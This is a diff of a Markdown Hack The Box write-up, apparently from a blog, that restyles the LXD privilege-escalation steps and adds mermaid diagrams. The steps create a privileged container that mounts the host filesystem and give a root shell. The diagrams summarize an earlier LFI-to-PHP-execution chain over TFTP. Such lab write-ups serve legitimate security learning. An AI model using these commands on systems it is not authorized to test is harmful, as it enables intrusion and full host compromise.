@@ -100,22 +100,89 @@ And the `id` command has shown me something unusual. The user `mike` belongs to 
 For this to work, the two files `lxd.tar.xz` and `rootfs.squashfs` are required. They can be found on the [official LXD images](https://images.lxd.canonical.com/) page. As i am not allowed to reach the internet via the HTB machine, i download these two files on to my local machine and move them to the machine using `python3 -m http.server 1337` as the server and `curl -O http://<my-ip>:1337/lxd.tar.xz` as the command from the target.
 
 After this was successful and the files are present, the following commands (taken from `HackTricks`) can be used in succession to gain code execution as `root`:
+
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+```
+<div class="annotate" markdown> (1) </div>
+
+1. 
+```bash
 # creates an image using the two files with the alias "alpine"
+```
 
+```
 lxc init alpine privesc -c security.privileged=true
+```
+<div class="annotate" markdown> (1) </div>
+
+1. 
+```bash
 # initiate the container "privesc" with the "alpine" image. security.privileged=true means that "root" in the container is "root" on the host
+```
 
+```bash
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+<div class="annotate" markdown> (1) </div>
+
+1. 
+```bash
 # configure the container to mount to the host filesystem
+```
 
+```bash
 lxc start privesc
+```
+<div class="annotate" markdown> (1) </div>
+
+1. 
+```bash
 # start the container
+```
 
+```bash
 lxc exec privesc /bin/sh
-# execute the command /bin/sh (start a shell in the container)
+```
+<div class="annotate" markdown> (1) </div>
 
+1. 
+```bash
+# execute the command /bin/sh (start a shell in the container)
+```
+
+```bash
 cd /mnt/root
+```
+<div class="annotate" markdown> (1) </div>
+
+1. 
+```bash
 # this gives you access to the host filesystem as root, where the flag can be read!
+```
+
+### Summary
+
+Below is a visualized summary of the exploitation steps used in this machine.
+
+``` mermaid
+graph LR
+  A[HTTP<br>service] -->|LFI| B[passwd file];
+  A[HTTP<br>service] -->|LFI| C[.htpasswd file];
+  B -->|Reveals| D[TFTP<br>service];
+  
+  E[TFTP<br>service] -->|Upload| F[PHP-code];
+  A -->|Access via<br>LFI| F;
+
+  F --> G[PHP-code<br>execution];
+  C -->|switch user| H[Terminal<br>access];
+  G -->|switch user| H[Terminal<br>access];
+```
+
+The privilege escalation to the user `root` worked as follows:
+
+``` mermaid
+graph LR
+  A[Terminal<br>access] -->|Belongs to| B[lxd Group];
+  B -->|create<br>privileged<br>container| D[Command<br>execution<br>as root];
 ```
